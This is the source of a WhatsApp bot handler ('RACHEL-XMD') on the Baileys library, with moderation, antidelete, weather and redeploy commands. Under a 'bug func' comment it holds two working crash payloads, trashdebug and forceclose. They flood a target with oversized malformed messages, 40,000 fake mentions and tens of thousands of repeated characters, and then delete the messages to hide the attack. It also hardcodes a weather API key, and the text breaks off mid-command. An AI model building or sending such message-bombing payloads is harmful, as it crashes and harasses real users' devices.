require("./daveenv")
const { downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia, generateWAMessageFromContent, GroupSettingChange, jidDecode, WAGroupMetadata, emitGroupParticipantsUpdate, emitGroupUpdate, generateMessageID, jidNormalizedUser, generateForwardMessageContent, WAGroupInviteMessageGroupMetadata, GroupMetadata, Headers, delay, WA_DEFAULT_EPHEMERAL, WADefault, getAggregateVotesInPollMessage, generateWAMessageContent, areJidsSameUser, useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaconnet, makeInMemoryStore, MediaType, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, initInMemoryKeyStore, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WAMediaUpload, mentionedJid, processTime, Browser, MessageType,
Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, DisconnectReason, WAconnet, getStream, WAProto, isBaileys, AnyMessageContent, templateMessage, InteractiveMessage, Header } = require("@whiskeysockets/baileys")
///package depedencies///////////////
const os = require('os')
const fs = require('fs')
const fg = require('api-dylux')
const fetch = require('node-fetch');
const axios = require('axios')
const { exec, execSync } = require("child_process")
const chalk = require('chalk')
const cheerio = require('cheerio');
const nou = require('node-os-utils')
const moment = require('moment-timezone');
const path = require ('path');
const didyoumean = require('didyoumean');
const similarity = require('similarity');
const speed = require('performance-now')
const { Sticker } = require('wa-sticker-formatter');
const { igdl } = require("btch-downloader");
const yts = require ('yt-search');
const { appname,antidel, herokuapi} = require("./set.js");

// ADD THESE IMPORTS FOR TOURL FUNCTIONALITY //
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
///////////////////////////////////////////////

global.db.data = JSON.parse(fs.readFileSync('./library/database/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}
///////////database access/////////////////
const { addPremiumUser, delPremiumUser } = require("./library/lib/premiun");
/////////exports////////////////////////////////
module.exports = async (dave, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
//////////Libraryfunction///////////////////////
const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./library/lib/function')
// Main Setting (Admin And Prefix )///////
const budy = (typeof m.text === 'string') ? m.text : '';
        const prefix = ['.', '/'] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.xprefix
const isCmd = body.startsWith(global.xprefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (dave.user.id.split(':')[0]+'@s.whatsapp.net' || dave.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = dave.user.id.split(':')[0];
const senderNumber = sender.split('@')[0]
const daveshown = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
    const premuser = JSON.parse(fs.readFileSync("./library/database/premium.json"));
const isNumber = x => typeof x === 'number' && !isNaN(x)
const formatJid = num => num.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
const isPremium = daveshown || premuser.map(u => formatJid(u.id)).includes(m.sender);
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const groupMetadata = m.isGroup ? await dave.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
/////////////Setting Console//////////////////
console.log(chalk.black(chalk.bgWhite(!command ? '[ MESSAGE ]' : '[ COMMAND ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
/////////quoted functions//////////////////
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `RACHEL-XMD`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://files.catbox.moe/yqbio5.jpg' }}}}
let chats = global.db.data.chats[from]
               if (typeof chats !== 'object') global.db.data.chats[from] = {}
               if (chats) {
                   if (!('antilink' in chats)) chats.antilink = false
                  if (!('antilinkgc' in chats)) chats.antilinkgc = false
                           if (!('welcome' in chats)) chats.welcome = false
        if (!('goodbye' in chats)) chats.goodbye = false
        if (!('warn' in chats)) chats.warn = {}
               } else global.db.data.chats[from] = {
                  antilinkgc: false,
                  antilinkgc: false,
                  welcome: false,
                  goodbye: false,
                  warn: {} 
               }
    if (db.data.chats[m.chat].antilinkgc) {
            if (budy.match(`chat.whatsapp.com`)) {
               bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (daveshown) return m.reply(bvl)
               await dave.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			dave.sendMessage(from, {text:`\`\`\`「 GC Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        if (db.data.chats[m.chat].antilink) {
            if (budy.match('http') && budy.match('https')) {
               bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (daveshown) return m.reply(bvl)
               await dave.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			dave.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        if (db.data.chats[m.chat].warn && db.data.chats[m.chat].warn[m.sender]) {
      const warnings = db.data.chats[m.chat].warn[m.sender]

      if (warnings >= setting.warnCount) {
        if (!isBotAdmins || isAdmins || daveshown) return

        await dave.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.sender
          }
        })
      }
    }

const setting = db.data.settings[botNumber]
        if (typeof setting !== 'object') db.data.settings[botNumber] = {}
	    if (setting) {
//    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
            if (!('autoread' in setting)) setting.autoread = false
            if (!('autoTyping' in setting)) setting.autoTyping = false
            if (!('autoRecord' in setting)) setting.autoRecord = false
//        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
//        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
       if (!('onlygrub' in setting)) setting.onlygrub = false
	  } else db.data.settings[botNumber] = {
   	  anticall: false,
    		status: 0,
    		stock:10,
    		autobio: false,
    		autoTyping: true,
   		auto_ai_grup: false,
   		goodbye: false,
    		onlygrub: false,
       welcome: true, 
    		autoread: false,
    		menuType: 'externalImage' //> buttonImage
	    }



if (!m.key.fromMe && db.data.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await dave.readMessages([readkey]);
}
dave.sendPresenceUpdate('available', m.chat)
if (db.data.settings[botNumber].autoTyping) {
if (m.message) {
dave.sendPresenceUpdate('composing', m.chat)
}
}
if (db.data.settings[botNumber].autoRecord) {
if (m.message) {
dave.sendPresenceUpdate('recording', m.chat)
}
}
if (db.data.settings[botNumber].autobio) {
let setting = db.data.settings[botNumber]
if (new Date() * 1 - setting.status > 1000) {
let uptime = await runtime(process.uptime())
await dave.updateProfileStatus(`✳️ RACHEL-XMD || 💠 Runtime : ${uptime}`)
setting.status = new Date() * 1
}
}
async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}
const lol = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnailUrl: "https://files.catbox.moe/tq6zy6.jpg",
      itemCount: "999999",
      status: "INQUIRY",
      surface: "CATALOG",
      Runtime : "${runtime(process.uptime())}",
      message: `Sender : @${m.sender.split('@')[0]}\n愛とは何か？ `,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["13135550002@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

      

    
const mdmodes = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "13135559098@s.whatsapp.net"
} : {}),
id: `${Date.now()}-${Math.random().toString(36).slice(2)}`
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `RACHEL-XMD`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
},
status: 1,
  participant: "0@s.whatsapp.net"
}
const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: "giftdee" }}}

////////////////Reply Message////////////////
const replypic = fs.readFileSync('./library/media/connect.jpg');
const quotedMessage = m.quoted?.message?.extendedTextMessage?.contextInfo?.quotedMessage || m.quoted?.message?.imageMessage || m.quoted?.message?.videoMessage;
async function reply(teks) {
dave.sendMessage(m.chat, {
text: teks,
contextInfo: {
forwardingScore: 9,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363400480173280@newsletterr",
newsletterName: "RACHEL-XMD" 
}
}
}, {
quoted: fkontak
})
}

const trashreply = (teks) => {
dave.sendMessage(from, { text : teks }, { quoted : fkontak })
}
const trashpic = fs.readFileSync('./library/media/porno.jpg');
async function replymenu(teks) {
dave.sendMessage(m.chat, {
image:trashpic,  
caption: teks,
sourceUrl: 'https://github.com/giftdee',    
contextInfo: {
forwardingScore: 9,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363400480173280@newsletter",
newsletterName: "RACHEL-XMD"
}
}
}, {
quoted: fkontak
})
}
 //////////React message///////////////
    const reaction = async (jidss, emoji) => {
    dave.sendMessage(jidss, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };
 /////////function set presence/////
                  /* if (global.autoRecording) {
        dave.sendPresenceUpdate('recording', from)
        }      
      if (global.autoTyping) {
        dave.sendPresenceUpdate('composing', from)
        }
        if (global.autorecordtype) {
        let trashrecord = ['recording','composing']
        let xeonrecordinfinal = trashrecord[Math.floor(Math.random() * trashrecord.length)]
        dave.sendPresenceUpdate(xeonrecordinfinal, from)

        }*/
if (m.isGroup) {
    if (body.includes(`@254104260236`)) {
        reaction(m.chat, "❓")
    }
 }
///////////////Similarity///////////////////////
function getCaseNames() {
  try {
    const data = fs.readFileSync('./davehandler.js', 'utf8');
    const casePattern = /case\s+'([^']+)'/g;
    const matches = data.match(casePattern);

    if (matches) {
      return matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
    } else {
      return [];
    }
  } catch (error) {
    console.error('error occurred:', error);
    throw error;
  }
}

/////////////fetch commands///////////////
let totalfeature= () =>{
var mytext = fs.readFileSync("./davehandler.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length;
return numUpper
        }
////////////tag owner reaction//////////////
if (m.isGroup) {
    if (body.includes(`@${owner}`)) {
        reaction(m.chat, "❌")
    }
 }
/////////////test bot no prefix///////////////
if ((budy.match) && ["bot",].includes(budy) && !isCmd) {
reply(`bot is always online ✅`)
}	
///////////example///////////////////////////
////////bug func/////////////////////
   async function trashdebug(target) {
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = "image/webp"; // ✅ diperbaiki jadi string

  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`, // ✅ backtick template
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            `/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}`, // ✅ template fixed
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1000 * 40 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * 20000000), // ✅ tidak negatif
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = await generateWAMessageFromContent(target, message, {});

  await dave.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
 
    async function forceclose(target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ᴅᴀᴠᴇ-ᴄʀᴀsʜ" + "ꦽ".repeat(50000),
            },
            footer: {
              text: "ꦽ".repeat(50000),
            },
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
              forwardingScore: 999,
              isForwarded: true
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "payment",
                  buttonParamsJson: "\u2063".repeat(30000)
                },
              ],
              messageParamsJson: "{{".repeat(10000),
            },
          },
        },
      },
    };

    const pertama = await dave.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target,
    });

    const kedua = await dave.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target,
    });

    await dave.sendMessage(target, {
      delete: {
        fromMe: true,
        remoteJid: target,
        id: pertama,
      }
    });

    await dave.sendMessage(target, {
      delete: {
        fromMe: true,
        remoteJid: target,
        id: kedua
      }
    });

  } catch (err) {
    console.error("Qiwiyz Error:", err);
  }

  console.log(chalk.red(`ForceClose is Coming to ${target}`));
}
    ////anti delete//////
const baseDir = 'message_data';
if (!fs.existsSync(baseDir)) {
  fs.mkdirSync(baseDir);
}

function loadChatData(remoteJid, messageId) {
  const chatFilePath = path.join(baseDir, remoteJid, `${messageId}.json`);
  try {
    const data = fs.readFileSync(chatFilePath, 'utf8');
    return JSON.parse(data) || [];
  } catch (error) {
    return [];
  }
}

function saveChatData(remoteJid, messageId, chatData) {
  const chatDir = path.join(baseDir, remoteJid);

  if (!fs.existsSync(chatDir)) {
    fs.mkdirSync(chatDir, { recursive: true });
  }

  const chatFilePath = path.join(chatDir, `${messageId}.json`);

  try {
    fs.writeFileSync(chatFilePath, JSON.stringify(chatData, null, 2));
  } catch (error) {
    console.error('Error saving chat data:', error);
  }
}

function handleIncomingMessage(message) {
  const remoteJid = message.key.remoteJid;
  const messageId = message.key.id;

  const chatData = loadChatData(remoteJid, messageId);
  chatData.push(message);
  saveChatData(remoteJid, messageId, chatData);
}

async function handleMessageRevocation(dave, revocationMessage) {
  const remoteJid = revocationMessage.key.remoteJid;
  const messageId = revocationMessage.message.protocolMessage.key.id;

  const chatData = loadChatData(remoteJid, messageId);
  const originalMessage = chatData[0];

  if (originalMessage) {
    const deletedBy = revocationMessage.participant || revocationMessage.key.participant || revocationMessage.key.remoteJid;
    const sentBy = originalMessage.key.participant || originalMessage.key.remoteJid;

    const deletedByFormatted = `@${deletedBy.split('@')[0]}`;
    const sentByFormatted = `@${sentBy.split('@')[0]}`;

    if (deletedBy.includes(dave.user.id) || sentBy.includes(dave.user.id)) return;

    let notificationText = `RACHEL-XMD ANTIDELETE💠\n\n` +
      ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗯𝘆 : ${deletedByFormatted}\n\n`;

    try {
      if (originalMessage.message?.conversation) {
        // Text message
        const messageText = originalMessage.message.conversation;
        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : ${messageText}`;
        await dave.sendMessage(dave.user.id, { text: notificationText });
      } 
      else if (originalMessage.message?.extendedTextMessage) {
        // Extended text message (quoted messages)
        const messageText = originalMessage.message.extendedTextMessage.text;
        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗖𝗼𝗻𝘁𝗲𝗻𝘁 : ${messageText}`;
        await dave.sendMessage(dave.user.id, { text: notificationText });
      }
      else if (originalMessage.message?.imageMessage) {
        // Image message
        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Image]`;
        try {
          const buffer = await dave.downloadMediaMessage(originalMessage.message.imageMessage);
          await dave.sendMessage(dave.user.id, { 
            image: buffer,
	    caption: `${notificationText}\n\nImage caption: ${originalMessage.message.imageMessage.caption}`
          });
        } catch (mediaError) {
          console.error('Failed to download image:', mediaError);
          notificationText += `\n\n⚠️ Could not recover deleted image (media expired)`;
          await dave.sendMessage(dave.user.id, { text: notificationText });
        }
      } 
      else if (originalMessage.message?.videoMessage) {
        // Video message
        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Video]`;
        try {
          const buffer = await dave.downloadMediaMessage(originalMessage.message.videoMessage);
          await dave.sendMessage(dave.user.id, { 
            video: buffer, 
            caption: `${notificationText}\n\nVideo caption: ${originalMessage.message.videoMessage.caption}`
          });
        } catch (mediaError) {
          console.error('Failed to download video:', mediaError);
          notificationText += `\n\n⚠️ Could not recover deleted video (media expired)`;
          await dave.sendMessage(dave.user.id, { text: notificationText });
        }
      } else if (originalMessage.message?.stickerMessage) {
	 notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Sticker]`;
      // Sticker message
      const buffer = await dave.downloadMediaMessage(originalMessage.message.stickerMessage);      
      await dave.sendMessage(dave.user.id, { sticker: buffer, 
contextInfo: {
          externalAdReply: {
          title: notificationText,
          body: `DELETED BY : ${deletedByFormatted}`,
          thumbnail: trashpic,
          sourceUrl: '',
          mediaType: 1,
          renderLargerThumbnail: false
          }}});
      } else if (originalMessage.message?.documentMessage) {
        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Document]`;
        // Document message
        const docMessage = originalMessage.message.documentMessage;
        const fileName = docMessage.fileName || `document_${Date.now()}.dat`;
        console.log('Attempting to download document...');
        const buffer = await dave.downloadMediaMessage(docMessage);
        
       if (!buffer) {
            console.log('Download failed - empty buffer');
            notificationText += ' (Download Failed)';
            return;
        }
        
        console.log('Sending document back...');
        await dave.sendMessage(dave.user.id, { 
            document: buffer, 
            fileName: fileName,
            mimetype: docMessage.mimetype || 'application/octet-stream',
contextInfo: {
          externalAdReply: {
          title: notificationText,
          body: `DELETED BY: \n\n ${deletedByFormatted}`,
          thumbnail: trashpic,
          sourceUrl: '',
          mediaType: 1,
          renderLargerThumbnail: true
          }}});
      } else if (originalMessage.message?.audioMessage) {
	      notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮: \n\n [Audio]`;
      // Audio message
      const buffer = await dave.downloadMediaMessage(originalMessage.message.audioMessage);
      const isPTT = originalMessage.message.audioMessage.ptt === true;
      await dave.sendMessage(dave.user.id, { audio: buffer, ptt: isPTT, mimetype: 'audio/mpeg', 
contextInfo: {
          externalAdReply: {
          title: notificationText,
          body: `DELETED BY: \n\n ${deletedByFormatted}`,
          thumbnail: trashpic,
          sourceUrl: '',
          mediaType: 1,
          renderLargerThumbnail: true
          }}});
      }	      
    } catch (error) {
      console.error('Error handling deleted message:', error);
      notificationText += `\n\n⚠️ Error recovering deleted content 😓`;
      await dave.sendMessage(dave.user.id, { text: notificationText });
    }
  }
}




        


 if (antidel === "TRUE") {
        if (mek.message?.protocolMessage?.key) {
          await handleMessageRevocation(dave, mek);
        } else {
          handleIncomingMessage(mek);
        }
	  }                   
                        
                
                    

            
                
    


        
                        
                

            

            

    
///////////end bug func///////////
const example = (teks) => {
return `\n *invalid format!*\n`
}
const menu = require('./library/listmenu/menulist');
/////////////plugins commands/////////////
const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}
//========= [ COMMANDS PLUGINS ] =================================================
let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "daveplugs"))
const trashdex = { daveshown, reply,replymenu,command,isCmd, text, botNumber, prefix, reply,fetchJson,example, totalfeature,dave,m,q,mime,sleep,fkontak,addPremiumUser, args,delPremiumUser,isPremium,trashpic,trashdebug,sleep,isAdmins,groupAdmins,isBotAdmins,quoted,from,groupMetadata,downloadAndSaveMediaMessage,forceclose,menu,quotedMessage}
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "function") return
await plugin(m, trashdex)
}
}
if (!pluginsDisable) return
switch (command) {
case 'script':
case 'repo': {
  const botInfo = `
╭─ ⌬ Bot Info
│ • Name    : ${botname}
│ • Owner   : ${ownername}
│ • Version  : ${botversion}
│ • Repo : gitHub.com/giftdee/RACHEL-XMD/fork 
│ • Runtime  : ${runtime(process.uptime())}\n╰─────────────
`
  reply(botInfo)
}
break
//==================================================//     
        case "update": case "redeploy": {
		      const axios = require('axios');

		if(!daveshown) return reply(mess.owner);
		     if (!appname || !herokuapi) {
            await reply("It looks like the Heroku app name or API key is not set. Please make sure you have set the `APP_NAME` and `HEROKU_API` environment variables.");
            return;
        }

        async function redeployApp() {
            try {
                const response = await axios.post(
                    `https://api.heroku.com/apps/${appname}/builds`,
                    {
                        source_blob: {
                            url: "https://github.com/Finjohns/Black-Demon/tarball/main",
                        },
                    },
                    {
                        headers: {
                            Authorization: `Bearer ${herokuapi}`,
                            Accept: "application/vnd.heroku+json; version=3",
                        },
                    }
                );

                await m.reply("Your bot is undergoing an upgrade, hold  for the next 2 minutes as the redeploy executes! Once done, you’ll have the freshest version of *Black-Demon* .");
                console.log("Build details:", response.data);
            } catch (error) {
                const errorMessage = error.response?.data || error.message;
                await reply(`Failed to update and redeploy. Please check if you have set the Heroku API key and Heroku app name correctly.`);
                console.error("Error triggering redeploy:", errorMessage);
            }
        }

        redeployApp();
    }
	break;
//==================================================//     
   case 'weather': {
		      try {

if (!text) return reply("provide a city/town name");

const response = await fetch(`http://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=1ad47ec6172f19dfaf89eb3307f74785`);
        const data = await response.json();

console.log("Weather data:",data);

        const cityName = data.name;
        const temperature = data.main.temp;
        const feelsLike = data.main.feels_like;
        const minTemperature = data.main.temp_min;
        const maxTemperature = data.main.temp_max;
        const description = data.weather[0].description;
        const humidity = data.main.humidity;
        const windSpeed = data.wind.speed;
        const rainVolume = data.rain ? data.rain['1h'] : 0;
        const cloudiness = data.clouds.all;
        const sunrise = new Date(data.sys.sunrise * 1000);
        const sunset = new Date(data.sys.sunset * 1000);

await m.reply(`❄️ Weather in ${cityName}

🌡️ Temperature: ${temperature}°C
📝 Description: ${description}
❄️ Humidity: ${humidity}%
🌀 Wind Speed: ${windSpeed} m/s
🌧️ Rain Volume (last hour): ${rainVolume} mm
☁️ Cloudiness: ${cloudiness}%
🌄 Sunrise: ${sunrise.toLocaleTimeString()}
🌅 Sunset: ${sunset.toLocaleTimeString()}`);

} catch (e) { reply("Unable to find that location.") }
  }
   break;
//==================================================//        
  case 'gitclone': {
		      if (!text) return m.reply(`Where is the link?`)
if (!text.includes('github.com')) return reply(`Is that a GitHub repo link ?!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user3, repo] = text.match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user3}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    await dave.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply("error"))

		    }
		      break;

 //==================================================//     
        case 'uptime':
  const uptime = process.uptime();
  const days = Math.floor(uptime / (24 * 3600));
  const hours = Math.floor((uptime % (24 * 3600)) / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
